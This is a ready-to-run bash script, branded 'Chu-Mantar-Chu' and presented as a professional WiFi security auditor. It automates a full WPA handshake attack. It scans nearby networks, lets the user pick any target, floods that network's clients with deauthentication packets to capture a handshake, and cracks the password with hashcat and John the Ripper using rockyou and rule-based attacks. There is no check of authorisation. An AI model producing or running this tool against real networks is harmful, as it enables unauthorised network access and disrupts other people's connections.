#!/bin/bash
# ==============================================================================
# Project: Chu-Mantar-Chu
# Description: Professional WPA2/WPA3 Security Auditing & Password Recovery
# Features: GPU Acceleration (Hashcat), Rule-based Cracking (John the Ripper)
# Author: Professional Refactor
# ==============================================================================

# --- Configuration & Styling ---
set -e # Exit on error

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Defaults
DEFAULT_INTERFACE="wlan0"
DEFAULT_WORDLIST="/usr/share/wordlists/rockyou.txt"
OUTPUT_DIR="/tmp/chu-mantar-chu"
SCAN_TIMEOUT=15
GPU_ENABLED=0

# --- Helper Functions ---

log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be executed with root privileges (sudo)."
        exit 1
    fi
}

display_banner() {
    clear
    echo -e "${BLUE}"
    echo "  ╔══════════════════════════════════════════════════════╗"
    echo "  ║                🪄  CHU-MANTAR-CHU  🪄                 ║"
    echo "  ║        Professional WiFi Security Auditor v2.0         ║"
    echo "  ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_dependencies() {
    log_info "Verifying system dependencies..."
    local deps=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng" "john" "hashcat" "wpaclean" "hcxpcapngtool")
    local missing=()

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done

    if [ ${#missing[@]} -ne 0 ]; then
        log_warn "Missing dependencies: ${missing[*]}"
        log_info "Attempting to install missing tools..."
        apt update -qq && apt install -y aircrack-ng john hashcat hcxtools -qq
    fi

    # GPU Detection
    if command -v nvidia-smi &> /dev/null || command -v rocm-smi &> /dev/null; then
        log_success "Hardware acceleration (GPU) detected."
        GPU_ENABLED=1
    else
        log_warn "No GPU detected. Falling back to CPU-only mode."
    fi
}

setup_monitor_mode() {
    local iface=$1
    log_info "Configuring $iface for monitor mode..."
    
    airmon-ng check kill &>/dev/null
    airmon-ng start "$iface" &>/dev/null
    
    # Identify the monitor interface name
    MON_IFACE=$(iw dev | grep Interface | awk '{print $2}' | grep -E "${iface}mon|${iface}")
    
    if [[ -z "$MON_IFACE" ]]; then
        log_error "Failed to enable monitor mode on $iface."
        exit 1
    fi
    log_success "Monitor mode active on: $MON_IFACE"
}

scan_and_select() {
    log_info "Scanning for nearby networks (${SCAN_TIMEOUT}s)..."
    local scan_file="scan_results"
    
    # Run airodump-ng in background
    timeout "$SCAN_TIMEOUT" airodump-ng "$MON_IFACE" --output-format csv -w "$scan_file" >/dev/null 2>&1 || true
    
    echo -e "\n${BLUE}ID\tBSSID\t\t\tCH\tPWR\tESSID${NC}"
    echo "----------------------------------------------------------------------"
    
    # Parse CSV and display
    awk -F',' 'NR>1 && $1 ~ /:/ {print NR-1 "\t" $1 "\t" $4 "\t" $9 "\t" $14}' "${scan_file}-01.csv" | column -t -s $'\t'
    
    echo -ne "\n${YELLOW}Enter the BSSID of the target: ${NC}"
    read -r TARGET_BSSID
    echo -ne "${YELLOW}Enter the Channel of the target: ${NC}"
    read -r TARGET_CHANNEL
}

capture_handshake() {
    log_info "Initiating handshake acquisition for $TARGET_BSSID..."
    local cap_prefix="capture"
    
    # Start capture in background
    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$cap_prefix" "$MON_IFACE" >/dev/null 2>&1 &
    local AIRO_PID=$!
    
    # Perform deauthentication flood
    log_info "Sending deauthentication packets..."
    aireplay-ng -0 10 -a "$TARGET_BSSID" "$MON_IFACE" >/dev/null 2>&1
    
    # Wait for handshake
    log_info "Monitoring for 4-way handshake..."
    for i in {1..60}; do
        if aircrack-ng "${cap_prefix}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
            log_success "Handshake captured successfully!"
            kill $AIRO_PID 2>/dev/null || true
            return 0
        fi
        echo -ne "${YELLOW}Waiting... (${i}s)${NC}\r"
        sleep 1
    done
    
    kill $AIRO_PID 2>/dev/null || true
    log_error "Handshake capture timed out."
    return 1
}

process_hashes() {
    log_info "Converting capture to cracking formats..."
    wpaclean cleaned.cap capture-01.cap &>/dev/null
    hcxpcapngtool -o target.hc22000 cleaned.cap &>/dev/null
    
    # For legacy hashcat support
    if command -v cap2hccapx &>/dev/null; then
        cap2hccapx cleaned.cap target.hccapx &>/dev/null
    fi

    if [[ -f "target.hc22000" ]]; then
        log_success "Hashes prepared: target.hc22000"
        return 0
    fi
    return 1
}

crack_engine() {
    log_info "Starting recovery engine..."
    
    # Stage 1: GPU Hashcat (If available)
    if [[ $GPU_ENABLED -eq 1 && -f "target.hccapx" ]]; then
        log_info "Stage 1: Executing Hashcat GPU Attack..."
        hashcat -m 2500 -a 0 target.hccapx "$WORDLIST" --force --status --status-timer 10
        if hashcat -m 2500 target.hccapx --show | grep -q ":"; then
            local pass=$(hashcat -m 2500 target.hccapx --show | awk -F':' '{print $NF}')
            log_success "PASSWORD RECOVERED (Hashcat): $pass"
            return 0
        fi
    fi

    # Stage 2: John the Ripper (Wordlist)
    log_info "Stage 2: Executing John the Ripper Wordlist Attack..."
    john --wordlist="$WORDLIST" --format=wpapsk target.hc22000
    
    # Stage 3: John the Ripper (Rules)
    log_info "Stage 3: Executing John the Ripper Rule-based Attack..."
    john --rules --format=wpapsk target.hc22000
    
    # Check results
    local result=$(john --show --format=wpapsk target.hc22000 | awk -F: 'NR==1 {print $2}')
    if [[ -n "$result" ]]; then
        log_success "PASSWORD RECOVERED (John): $result"
        return 0
    fi

    log_warn "Recovery failed with current wordlist. Try a more comprehensive list."
    return 1
}

# --- Main Execution ---

main() {
    check_root
    display_banner
    check_dependencies

    # User Input
    echo -ne "${YELLOW}Wireless Interface [${DEFAULT_INTERFACE}]: ${NC}"
    read -r USER_IFACE
    INTERFACE=${USER_IFACE:-$DEFAULT_INTERFACE}

    echo -ne "${YELLOW}Wordlist Path [${DEFAULT_WORDLIST}]: ${NC}"
    read -r USER_WL
    WORDLIST=${USER_WL:-$DEFAULT_WORDLIST}

    if [[ ! -f "$WORDLIST" ]]; then
        log_warn "Wordlist not found. Downloading rockyou.txt..."
        curl -sL "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" -o rockyou.txt
        WORDLIST="rockyou.txt"
    fi

    # Execution Flow
    mkdir -p "$OUTPUT_DIR" && cd "$OUTPUT_DIR"
    
    setup_monitor_mode "$INTERFACE"
    scan_and_select
    
    if capture_handshake; then
        process_hashes
        crack_engine
    else
        log_error "Exiting due to capture failure."
        exit 1
    fi

    log_success "Audit Complete. Results saved in $OUTPUT_DIR"
}

main "$@"
